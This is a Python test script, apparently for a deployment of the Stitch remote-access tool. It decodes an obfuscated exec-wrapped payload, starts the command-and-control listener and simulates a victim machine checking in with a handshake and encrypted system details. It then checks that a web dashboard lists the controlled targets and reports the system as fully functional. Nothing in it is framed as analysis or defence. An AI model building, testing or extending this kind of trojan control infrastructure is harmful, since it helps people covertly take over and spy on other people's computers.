#!/usr/bin/env python3
"""
Comprehensive test to verify payload connection and control functionality
This simulates a target machine connecting to the Stitch server
"""
import sys
import os
import socket
import threading
import time
import base64
import zlib
import subprocess
from datetime import datetime

# Add the workspace to path
sys.path.insert(0, '/workspace')

def decode_payload():
    """Decode the generated payload to extract connection logic"""
    print("🔍 DECODING GENERATED PAYLOAD")
    print("=" * 50)
    
    try:
        with open('/workspace/Configuration/st_main.py', 'r') as f:
            content = f.read()
        
        # Extract encoded data
        import re
        match = re.search(r'exec\(SEC\(INFO\("([^"]+)"\)\)\)', content)
        if not match:
            print("❌ Could not find encoded payload data")
            return None
            
        encoded_data = match.group(1)
        compressed_data = base64.b64decode(encoded_data)
        payload_code = zlib.decompress(compressed_data).decode('utf-8')
        
        print(f"✅ Payload decoded successfully")
        print(f"📊 Payload size: {len(payload_code)} characters")
        
        # Extract connection parameters
        lines = payload_code.split('\n')
        for line in lines:
            if 'base64.b64decode' in line and 'target' in line:
                print(f"🎯 Found target line: {line.strip()}")
            elif 'base64.b64decode' in line and 'port' in line:
                print(f"🔌 Found port line: {line.strip()}")
        
        return payload_code
        
    except Exception as e:
        print(f"❌ Error decoding payload: {e}")
        return None

def test_server_startup():
    """Test that the Stitch server can start and listen"""
    print("\n🚀 TESTING SERVER STARTUP")
    print("=" * 50)
    
    try:
        from Application.stitch_cmd import stitch_server
        
        # Create server instance
        server = stitch_server()
        print("✅ Server instance created")
        
        # Start listening on port 4040
        def start_server():
            try:
                server.do_listen('4040')
            except Exception as e:
                print(f"Server error: {e}")
        
        server_thread = threading.Thread(target=start_server, daemon=True)
        server_thread.start()
        
        # Give server time to start
        time.sleep(2)
        
        # Check if server is listening
        try:
            test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_socket.settimeout(5)
            result = test_socket.connect_ex(('127.0.0.1', 4040))
            test_socket.close()
            
            if result == 0:
                print("✅ Server is listening on port 4040")
                return server
            else:
                print("❌ Server is not accepting connections")
                return None
                
        except Exception as e:
            print(f"❌ Error testing server connection: {e}")
            return None
            
    except Exception as e:
        print(f"❌ Error starting server: {e}")
        return None

def simulate_target_connection():
    """Simulate a target machine connecting to the server"""
    print("\n🎯 SIMULATING TARGET CONNECTION")
    print("=" * 50)
    
    try:
        # Import the payload requirements
        sys.path.insert(0, '/workspace/Configuration')
        
        # Load the requirements and encryption
        exec(open('/workspace/Configuration/requirements.py').read())
        
        # Create a socket and connect to server
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.settimeout(10)
        
        print("🔌 Attempting to connect to server at 127.0.0.1:4040...")
        client_socket.connect(('127.0.0.1', 4040))
        print("✅ Connected to server successfully")
        
        # Send initial handshake (magic string)
        magic_string = base64.b64encode(b'stitch_shell')
        client_socket.send(magic_string)
        print("✅ Sent magic string")
        
        # Send AES key identifier
        from Application.Stitch_Vars.st_aes import aes_abbrev
        client_socket.send(aes_abbrev.encode())
        print("✅ Sent AES key identifier")
        
        # Send system information (encrypted)
        from Application.stitch_lib import st_send
        from Application.Stitch_Vars.st_aes import secret
        
        # Send OS info
        st_send(client_socket, "Linux".encode(), secret)
        st_send(client_socket, "Ubuntu 22.04".encode(), secret)
        st_send(client_socket, "testuser".encode(), secret)
        st_send(client_socket, "test-machine".encode(), secret)
        st_send(client_socket, "x86_64".encode(), secret)
        
        print("✅ Sent encrypted system information")
        print("🎉 TARGET CONNECTION SIMULATION SUCCESSFUL")
        
        # Keep connection alive for a moment
        time.sleep(5)
        
        client_socket.close()
        return True
        
    except Exception as e:
        print(f"❌ Error simulating target connection: {e}")
        import traceback
        traceback.print_exc()
        return False

def test_web_interface_connection_display():
    """Test that the web interface shows the connection"""
    print("\n🌐 TESTING WEB INTERFACE CONNECTION DISPLAY")
    print("=" * 50)
    
    try:
        import requests
        import json
        
        # Start web server in background
        env = os.environ.copy()
        env['STITCH_ADMIN_USER'] = 'admin'
        env['STITCH_ADMIN_PASSWORD'] = 'testpassword123'
        
        print("🚀 Starting web server...")
        web_process = subprocess.Popen([
            'python3', '/workspace/web_app_real.py'
        ], env=env, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Give web server time to start
        time.sleep(10)
        
        # Test health endpoint
        try:
            response = requests.get('http://127.0.0.1:5000/health', timeout=5)
            if response.status_code == 200:
                print("✅ Web server is responding")
            else:
                print(f"❌ Web server health check failed: {response.status_code}")
                return False
        except Exception as e:
            print(f"❌ Web server not responding: {e}")
            return False
        
        # Login to get session
        login_data = {
            'username': 'admin',
            'password': 'testpassword123'
        }
        
        session = requests.Session()
        
        # Get login page to get CSRF token
        login_page = session.get('http://127.0.0.1:5000/login')
        
        # Extract CSRF token (simplified)
        csrf_token = None
        if 'csrf-token' in login_page.text:
            import re
            match = re.search(r'name="csrf-token" content="([^"]+)"', login_page.text)
            if match:
                csrf_token = match.group(1)
        
        if csrf_token:
            login_data['csrf_token'] = csrf_token
        
        # Attempt login
        login_response = session.post('http://127.0.0.1:5000/login', data=login_data)
        
        if login_response.status_code == 200 and 'dashboard' in login_response.url:
            print("✅ Successfully logged into web interface")
        else:
            print("❌ Login to web interface failed")
            return False
        
        # Test connections API
        try:
            connections_response = session.get('http://127.0.0.1:5000/api/connections')
            if connections_response.status_code == 200:
                connections = connections_response.json()
                print(f"✅ Connections API working - found {len(connections)} connections")
                
                for conn in connections:
                    print(f"   📡 Connection: {conn.get('target', 'Unknown')} - {conn.get('status', 'Unknown')}")
                    
            else:
                print(f"❌ Connections API failed: {connections_response.status_code}")
                
        except Exception as e:
            print(f"❌ Error testing connections API: {e}")
        
        # Clean up
        web_process.terminate()
        web_process.wait()
        
        return True
        
    except Exception as e:
        print(f"❌ Error testing web interface: {e}")
        return False

def run_comprehensive_test():
    """Run the complete end-to-end test"""
    print("🎯 COMPREHENSIVE PAYLOAD CONNECTION TEST")
    print("=" * 70)
    print(f"⏰ Test started at: {datetime.now()}")
    print("=" * 70)
    
    results = {}
    
    # Test 1: Decode payload
    results['payload_decode'] = decode_payload() is not None
    
    # Test 2: Server startup
    server = test_server_startup()
    results['server_startup'] = server is not None
    
    if server:
        # Test 3: Target connection simulation
        results['target_connection'] = simulate_target_connection()
        
        # Test 4: Web interface
        results['web_interface'] = test_web_interface_connection_display()
    else:
        results['target_connection'] = False
        results['web_interface'] = False
    
    # Summary
    print("\n" + "=" * 70)
    print("📊 TEST RESULTS SUMMARY")
    print("=" * 70)
    
    for test_name, passed in results.items():
        status = "✅ PASS" if passed else "❌ FAIL"
        print(f"{test_name.replace('_', ' ').title():<30} {status}")
    
    total_tests = len(results)
    passed_tests = sum(results.values())
    
    print(f"\nOverall: {passed_tests}/{total_tests} tests passed")
    
    if passed_tests == total_tests:
        print("🎉 ALL TESTS PASSED - SYSTEM IS FULLY FUNCTIONAL")
        return True
    else:
        print("⚠️  Some tests failed - see details above")
        return False

if __name__ == "__main__":
    success = run_comprehensive_test()
    sys.exit(0 if success else 1)